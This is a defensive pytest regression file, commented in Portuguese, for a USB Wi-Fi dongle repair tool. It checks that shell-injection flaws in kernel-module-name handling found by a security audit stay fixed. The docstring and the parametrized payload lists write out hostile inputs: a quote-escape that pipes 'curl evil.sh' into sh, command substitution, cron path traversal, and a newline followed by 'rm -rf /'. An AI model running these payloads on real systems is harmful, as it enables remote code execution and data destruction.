"""Regressoes da auditoria de seguranca ofensiva (ADR 0002 S1/S3/S6).

Cada teste aqui reproduz um ataque que FUNCIONOU contra o produto. Nao sao
exercicios teoricos: a auditoria montou os payloads, rodou contra o codigo real
e observou o resultado antes da correcao.

O achado central: `plan_state_b` interpolava o nome do modulo direto em strings
de shell, sem validacao, vindo de tres origens nao confiaveis (sysfs via
bound_driver/loaded_module e o JSON da base de conhecimento). Uma aspa simples
escapava do quoting e emendava comando arbitrario numa linha que o proprio
produto manda rodar com sudo:

    echo '148f 7601' | sudo tee /sys/bus/usb/drivers/mt7601u' ; curl evil.sh | sh ; '/new_id

`require_module_name` ja existia e nao era chamada nesse caminho.
"""

from __future__ import annotations

import pytest

from conftest import make_device
from dongle_rescue.repair.planner import plan_state_b
from dongle_rescue.repair.transaction import TransactionRecord, plan_rollback
from dongle_rescue.types import require_module_name

# --------------------------------------------------------------------------
# Payloads que sobreviviam ate os comandos montados pelo planner.
# --------------------------------------------------------------------------
MODULOS_HOSTIS = [
    pytest.param("mt7601u' ; curl evil.sh | sh ; '", id="aspa-simples-escapa-quoting"),
    pytest.param("mt7601u$(id)", id="substituicao-de-comando"),
    pytest.param("mt7601u`id`", id="backtick"),
    pytest.param("../../../../etc/cron.d/evil", id="travessia-de-caminho"),
    pytest.param("mt7601u\nrm -rf /", id="nova-linha"),
    pytest.param("-rf", id="hifen-inicial-vira-flag"),
    pytest.param("mt7601u; reboot", id="ponto-e-virgula"),
    pytest.param("mt7601u|sh", id="pipe"),
]


def _kb(modulo: str) -> dict:
    return {
        "chipsets": [
            {
                "chipset": "TESTE",
                "usb_ids": ["148f:7601"],
                "new_id_feasible": True,
                "new_id_modules": [modulo],
                "notes": "auditoria",
            }
        ]
    }


@pytest.mark.parametrize("modulo", MODULOS_HOSTIS)
def test_kb_hostil_nao_gera_comando(modulo):
    """Modulo vindo do JSON da KB nao pode chegar cru a um comando."""
    with pytest.raises(ValueError, match="invalid kernel module name"):
        plan_state_b(device=make_device(vid="148f", pid="7601"), kb=_kb(modulo))


@pytest.mark.parametrize("modulo", MODULOS_HOSTIS)
def test_driver_do_sysfs_hostil_nao_gera_comando(modulo):
    """bound_driver vem do sysfs — entrada nao confiavel (S6)."""
    with pytest.raises(ValueError, match="invalid kernel module name"):
        plan_state_b(
            device=make_device(vid="148f", pid="7601"),
            kb=_kb("mt7601u"),
            bound_driver=modulo,
        )


@pytest.mark.parametrize("modulo", MODULOS_HOSTIS)
def test_modulo_carregado_hostil_nao_gera_comando(modulo):
    """loaded_module tambem vem do host."""
    with pytest.raises(ValueError, match="invalid kernel module name"):
        plan_state_b(
            device=make_device(vid="148f", pid="7601"),
            kb=_kb("mt7601u"),
            loaded_module=modulo,
        )


def test_caso_legitimo_continua_funcionando():
    """A correcao nao pode cegar o caminho feliz."""
    plano = plan_state_b(device=make_device(vid="148f", pid="7601"), kb=_kb("mt7601u"))

    comandos = " ".join(plano.commands)
    assert "/sys/bus/usb/drivers/mt7601u/new_id" in comandos
    # nenhum metacaractere de shell sobrou onde entra o nome do modulo
    for proibido in ("';", "$(", "`", "\n"):
        assert proibido not in comandos


# --------------------------------------------------------------------------
# Gramatica de nome de modulo: hifen inicial vira FLAG quando usado como
# argumento de comando. Nenhum modulo real do kernel comeca com hifen.
# --------------------------------------------------------------------------
@pytest.mark.parametrize("nome", ["-rf", "--force", "-", "-x"])
def test_modulo_nao_pode_comecar_com_hifen(nome):
    with pytest.raises(ValueError):
        require_module_name(nome)


@pytest.mark.parametrize("nome", ["mt7601u", "rtl8xxxu", "ath9k_htc", "rtw_8821cu", "a"])
def test_modulos_legitimos_continuam_validos(nome):
    assert require_module_name(nome) == nome


# --------------------------------------------------------------------------
# Rollback: `remove_file` sempre validou o caminho com rigor, mas
# `remove_new_id` aceitava qualquer string nao vazia como driver. O journal
# fica em disco e pode ser adulterado — e entrada nao confiavel (S6).
# --------------------------------------------------------------------------
def _registro(acao: dict) -> TransactionRecord:
    return TransactionRecord(
        transaction_id="0" * 64,
        before_state={},
        change={},
        after_state={},
        rollback_action=acao,
    )


@pytest.mark.parametrize(
    "driver",
    ["x; id", "mt7601u' ; sh ; '", "../../evil", "-rf", "mt7601u`id`"],
)
def test_rollback_rejeita_driver_hostil(driver):
    acao = {"op": "remove_new_id", "driver": driver, "vid_pid": "148f:7601"}
    with pytest.raises(ValueError):
        plan_rollback(_registro(acao))


@pytest.mark.parametrize(
    "vid_pid", ["148f", "148f:76011", "zzzz:7601", "148f:7601; id", ""]
)
def test_rollback_rejeita_vid_pid_malformado(vid_pid):
    acao = {"op": "remove_new_id", "driver": "mt7601u", "vid_pid": vid_pid}
    with pytest.raises(ValueError):
        plan_rollback(_registro(acao))


def test_rollback_legitimo_continua_funcionando():
    acao = {"op": "remove_new_id", "driver": "mt7601u", "vid_pid": "148f:7601"}
    passos = plan_rollback(_registro(acao))

    assert passos[0]["action"] == "remove_new_id"
    assert passos[0]["driver"] == "mt7601u"
    assert passos[0]["if_present"] is True
